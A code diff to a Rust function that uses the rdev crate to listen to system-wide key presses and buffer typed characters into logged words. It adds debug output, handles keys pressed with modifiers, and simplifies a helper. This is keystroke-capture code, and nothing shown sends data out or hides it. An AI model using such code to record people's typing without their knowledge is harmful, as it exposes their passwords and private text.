@@ -16,6 +16,7 @@ pub fn log_keys() {
     // blocking
     rdev::listen(move |event| {
         println!("logged so far: {:?}", words);
+        println!("processing event: {:?}", event);
 
         match event.event_type {
             KeyPress(key_pressed) => {
@@ -59,18 +60,19 @@ pub fn log_keys() {
                         mod_pressed = true;
                         flush_buffer(&mut words, &mut key_buffer, &mut cursor_pos);
                     }
-                    _ => {
-                        println!(
-                            "[pressed] key: {:?}, event.name: {:?}",
-                            key_pressed, event.name
-                        );
-                        // println!("[pressed] {:?}", key);
+                    _ if mod_pressed => {
+                        println!("[pressed while mod] event: {:?}", event);
+                        add_key_to_buffer(format!("{:?}", key_pressed), &mut key_buffer, cursor_pos);
+                        println!("logged not covered key {:?}", key_pressed);
+                    },
+                    _ /* if !mod_pressed*/ => {
+                        println!("[pressed while NO mod] event: {:?}", event);
                         if let Some(keycode) = event.name {
                             // add letters to the buffer, as we want to record words!
                             if keycode.bytes().last() < Some(127_u8)
                                 && keycode.bytes().last() > Some(31_u8)
                             {
-                                add_key_to_buffer(keycode, &mut key_buffer, cursor_pos).unwrap();
+                                add_key_to_buffer(keycode, &mut key_buffer, cursor_pos);
                                 cursor_pos += 1;
                             } else {
                                 // TODO handel alt, etc
@@ -90,6 +92,7 @@ pub fn log_keys() {
                         key_buffer.insert(0, format!("{:?} + ", key_released));
                         flush_buffer(&mut words, &mut key_buffer, &mut cursor_pos);
 
+                        mod_pressed = false;
                         println!("released")
                     }
                     _ => { /* noop for other key releases*/ }
@@ -119,11 +122,6 @@ fn flush_buffer(
     log_sequence(words, sequence);
 }
 
-fn add_key_to_buffer(
-    key: String,
-    buffer: &mut Vec<String>,
-    pos: usize,
-) -> Result<(), Box<dyn std::error::Error>> {
+fn add_key_to_buffer(key: String, buffer: &mut Vec<String>, pos: usize) {
     buffer.insert(pos, key);
-    Ok(())
 }
